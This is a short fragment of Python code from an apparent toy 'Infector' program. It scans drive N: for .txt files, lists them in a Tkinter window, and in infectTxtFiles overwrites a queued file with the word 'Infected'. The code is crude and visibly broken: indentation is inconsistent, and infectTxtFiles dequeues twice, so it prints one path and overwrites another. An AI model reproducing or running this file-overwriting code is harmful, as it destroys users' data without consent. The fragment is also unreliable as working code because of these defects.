for file in Infector().findTxtFilesGUI():
            label = Label(self.root, text= file + " Files")
            label.pack()


def infectTxtFiles(self):
        print("POPPED" + self.q.dequeue())
        FH = open(self.q.dequeue(), "w")
        FH.write("Infected")
        FH.close()
    
def findTxtFilesGUI(self):
        filedest = []
        for files in os.walk(r"N:"):
            for file in files[2]:
                if (file.split(".")[-1]) == "txt":
                    filedest.append("File found: " + files[0] + "\\" + file)
        return filedest